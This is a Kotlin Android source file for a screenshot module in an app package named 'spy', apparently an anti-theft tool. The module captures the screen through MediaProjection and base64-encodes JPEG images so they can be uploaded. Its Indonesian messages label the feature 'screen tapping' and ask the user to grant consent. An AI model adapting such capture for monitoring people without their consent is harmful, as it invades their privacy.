package com.antimaling.permanen.spy

import android.content.Context
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.os.Build
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import java.io.ByteArrayOutputStream

/**
 * Screenshot via MediaProjection. Izin diminta 1x lewat ShotConsentActivity.
 * Izin hangus tiap reboot -> user wajib aktifkan ulang (keterbatasan Android).
 */
object ShotTaker {
    @Volatile var projection: MediaProjection? = null

    data class ShotResult(val image: String, val err: String)

    fun hasConsent(): Boolean = try { projection != null } catch (_: Exception) { false }

    fun shot(c: Context): ShotResult {
        val mp = try { projection } catch (_: Exception) { null }
            ?: return ShotResult("", "Izin sadap layar belum aktif — buka app HP > Aktifkan Sadap Layar (wajib ulang tiap reboot).")
        var vd: android.hardware.display.VirtualDisplay? = null
        var reader: ImageReader? = null
        try {
            val wm = c.getSystemService(WindowManager::class.java)
                ?: return ShotResult("", "WindowManager tidak tersedia.")
            val m = DisplayMetrics()
            try {
                if (Build.VERSION.SDK_INT >= 30) {
                    val b = wm.currentWindowMetrics.bounds
                    m.widthPixels = b.width(); m.heightPixels = b.height()
                    m.densityDpi = c.resources.displayMetrics.densityDpi
                } else @Suppress("DEPRECATION") wm.defaultDisplay.getRealMetrics(m)
            } catch (e: Exception) { return ShotResult("", "Gagal baca ukuran layar: ${e.message}") }
            // downscale max 720p agar upload ringan
            var w = m.widthPixels; var h = m.heightPixels
            if (w <= 0 || h <= 0) return ShotResult("", "Ukuran layar invalid.")
            val scale = minOf(1f, 720f / w)
            w = (w * scale).toInt().coerceAtLeast(2); h = (h * scale).toInt().coerceAtLeast(2)
            reader = try { ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2) }
            catch (e: Exception) { return ShotResult("", "ImageReader gagal: ${e.message}") }
            val rd = reader ?: return ShotResult("", "ImageReader gagal.")
            vd = try {
                mp.createVirtualDisplay("shot", w, h, m.densityDpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, rd.surface, null, null)
            } catch (e: SecurityException) {
                projection = null
                return ShotResult("", "Izin dicabut sistem — aktifkan ulang Sadap Layar di app.")
            } catch (e: Exception) { return ShotResult("", "VirtualDisplay gagal: ${e.message}") }
            // tunggu frame sampai ~2.5 dtk (frame pertama sering telat)
            var img: Image? = null
            for (i in 0 until 10) {
                try {
                    val got = rd.acquireLatestImage()
                    if (got != null) { try { img?.close() } catch (_: Exception) {}; img = got; break }
                } catch (_: Exception) {}
                try { Thread.sleep(250) } catch (_: Exception) { break }
            }
            // buang frame basi, ambil yang terbaru
            try {
                var fresh = rd.acquireLatestImage()
                var guard = 0
                while (fresh != null && guard < 3) {
                    try { img?.close() } catch (_: Exception) {}
                    img = fresh; guard++
                    fresh = try { rd.acquireLatestImage() } catch (_: Exception) { null }
                }
                try { fresh?.close() } catch (_: Exception) {}
            } catch (_: Exception) {}
            val im = img ?: return ShotResult("", "Kamera layar timeout (tidak ada frame 2.5 dtk).")
            try {
                val planes = im.planes
                val buf = planes[0].buffer
                val pxStride = planes[0].pixelStride.coerceAtLeast(1)
                val rowStride = planes[0].rowStride
                val rowPad = (rowStride - pxStride * w).coerceAtLeast(0)
                val bmp = Bitmap.createBitmap(w + rowPad / pxStride, h, Bitmap.Config.ARGB_8888)
                bmp.copyPixelsFromBuffer(buf)
                val crop = Bitmap.createBitmap(bmp, 0, 0, w, h)
                val out = ByteArrayOutputStream()
                crop.compress(Bitmap.CompressFormat.JPEG, 55, out)
                try { bmp.recycle() } catch (_: Exception) {}
                try { if (crop != bmp) crop.recycle() } catch (_: Exception) {}
                val b64 = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
                if (b64.isBlank()) return ShotResult("", "Encode gambar kosong.")
                return ShotResult(b64, "")
            } finally { try { im.close() } catch (_: Exception) {} }
        } catch (e: Exception) {
            return ShotResult("", "Screenshot error: ${e.message}")
        } finally {
            try { vd?.release() } catch (_: Exception) {}
            try { reader?.close() } catch (_: Exception) {}
        }
    }

    /** Kompat lama. */
    fun capture(c: Context): String? {
        val r = shot(c)
        return if (r.image.isNotEmpty()) r.image else null
    }
}
